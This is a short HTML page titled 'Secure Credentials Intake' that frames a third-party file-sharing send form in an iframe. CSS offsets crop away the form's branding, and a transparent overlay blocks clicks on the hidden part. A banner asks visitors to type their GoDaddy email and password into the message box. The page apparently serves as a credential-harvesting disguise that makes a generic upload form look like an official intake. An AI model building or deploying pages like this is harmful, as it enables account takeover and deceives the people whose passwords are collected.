<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Secure Credentials Intake</title>
<style>
  :root {
    --offset: 360px;   /* how much of the top to hide */
    --vh: 1100px;      /* visible height of the box */
  }

  body {
    margin: 0;
    font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
  }

  .build-check {
    padding: 10px;
    background: #ffeb3b;
    color: #111;
    font: 700 14px/1 system-ui, -apple-system, Segoe UI, Roboto, Arial;
    text-align: center;
  }

  .viewport {
    position: relative;
    width: 100%;
    height: var(--vh);
    overflow: hidden;               /* crops top + right */
    border: 1px solid #ddd;
    border-radius: 12px;
    background: #fff;
    box-sizing: border-box;
  }

  .note {
    position: sticky;
    top: 0;
    z-index: 11;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 46px;
    padding: 10px 14px;
    font: 600 14px/1.3 system-ui,-apple-system,Segoe UI,Roboto,Arial;
    color:#222;
    background:#fff;
    border-bottom:1px solid #eee;
  }

  .ds-frame {
    position: absolute;
    inset: 0;
    border: 0;
    /* Show only left column */
    width: 200%; 
    height: calc(var(--vh) + var(--offset) + 800px);
    transform: translate(-50%, calc(var(--offset) * -1));
  }

  .click-shield {
    position: absolute;
    left: 0;
    top: 0;
    right: 0;
    height: var(--offset);
    pointer-events: auto;
    background: transparent;
    z-index: 10;
  }

  @media (max-width: 640px) {
    :root { --offset: 420px; --vh: 1250px; }
    .ds-frame { transform: translate(-50%, calc(var(--offset) * -1)); }
  }
</style>
</head>
<body>

  <div class="build-check">WRAPPER ACTIVE â€” left column only</div>

  <div class="viewport">
    <div class="note">Enter your GoDaddy Email (line 1) and Password (line 2) in the message box below.</div>

    <iframe
      class="ds-frame"
      src="https://websmartz.dropsecure.com/send/46f23185-34d3-4346-9673-60e62f9a9ea7"
      title="Secure Credentials Intake"></iframe>

    <div class="click-shield" aria-hidden="true"></div>
  </div>

</body>
</html>
